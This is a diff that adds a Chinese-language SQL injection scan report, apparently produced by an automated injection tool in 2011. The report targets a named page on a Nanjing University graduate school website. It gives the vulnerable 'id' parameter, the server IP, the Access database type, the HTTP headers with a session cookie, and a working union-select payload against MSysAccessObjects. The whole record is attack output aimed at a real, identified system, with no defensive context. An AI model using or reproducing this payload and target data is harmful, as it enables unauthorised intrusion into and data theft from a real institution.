@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://grawww.nju.edu.cn/view.asp?id=500
+ ·页面标题：南京大学研究生院
+ ·参数:id=500
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:202.119.56.10
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 10 Sep 2011 12:42:34 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 41114
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSCCRQSCQ=PKKOCBCBPPOKIHOJJGLMLNFF; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 4  显示的列= 1
+联合查询SQL: and 3=8 union select 1,2,3,4 from MSysAccessObjects
